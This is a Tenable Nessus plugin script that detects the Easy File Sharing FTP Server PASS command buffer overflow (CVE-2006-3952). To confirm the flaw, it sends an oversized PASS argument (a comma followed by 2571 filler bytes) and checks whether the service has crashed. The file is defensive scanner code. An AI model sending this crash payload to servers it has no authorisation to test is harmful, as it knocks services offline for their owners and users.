#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24021);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/20 13:54:16 $");

  script_cve_id("CVE-2006-3952");
  script_bugtraq_id(19243);
  script_osvdb_id(27646);
  script_xref(name:"EDB-ID", value:"2234");
  script_xref(name:"EDB-ID", value:"33538");

  script_name(english:"Easy File Sharing FTP Server PASS Command Overflow");
  script_summary(english:"Checks for PASS command buffer overflow vulnerability in EFS FTP Server");

  script_set_attribute(attribute:"synopsis", value:"The remote FTP server is affected by a buffer overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be using Easy File Sharing FTP Server, an
FTP server for Windows.

The version of Easy File Sharing FTP Server installed on the remote
host contains a stack-based buffer overflow vulnerability that can be
exploited by an unauthenticated attacker with a specially crafted PASS
command to crash the affected application or execute arbitrary code on
the affected host.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Easy File Sharing FTP Server 2.0 PASS Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");
include("misc_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_ftp_port(default: 21);

# Make sure the banner indicates it's WFTPD.
banner = get_ftp_banner(port:port);
if (!banner || "Easy File Sharing FTP Server" >!< banner)
 exit(0, "The FTP server on port "+port+" is not Easy File Sharing.");


soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");
s = ftp_recv_line(socket:soc);


# Try to exploit the flaw to crash the daemon.
user = get_kb_item("ftp/login");
if (!user) user = "anonymous";

c = strcat("USER ", user);
send(socket:soc, data: c+'\r\n');
s = ftp_recv_line(socket:soc);

if (s && '331 username ok, need password.' >< s) {
  exploit = strcat(",", crap(2571));
  c = strcat("PASS ", exploit);
  send(socket:soc, data: c+'\r\n');
  s = ftp_recv_line(socket:soc);
  close(soc);
  if (s) exit(0);

  # Check whether the server is down.
  if (service_is_dead(port: port, exit: 1) > 0)
    security_hole(port);
}
